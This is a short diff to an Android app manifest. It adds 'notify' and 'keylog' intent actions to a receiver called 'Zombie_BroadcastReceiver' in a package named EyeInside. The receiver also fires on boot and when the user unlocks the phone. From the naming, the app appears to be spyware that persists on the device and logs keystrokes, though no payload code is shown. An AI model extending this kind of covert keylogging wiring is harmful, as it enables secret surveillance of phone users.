@@ -87,6 +87,8 @@
         <receiver android:name=".Zombie_BroadcastReceiver" android:exported="false" >
             <intent-filter>
                 <action android:name="com.code4bones.EyeInside.wakeup" />
+                <action android:name="com.code4bones.EyeInside.notify" />
+                <action android:name="com.code4bones.EyeInside.keylog" />
                 <action android:name="android.media.RINGER_MODE_CHANGED"/>
                 <action android:name="android.intent.action.USER_PRESENT"/>
                 <action android:name="android.intent.action.BOOT_COMPLETED"/>
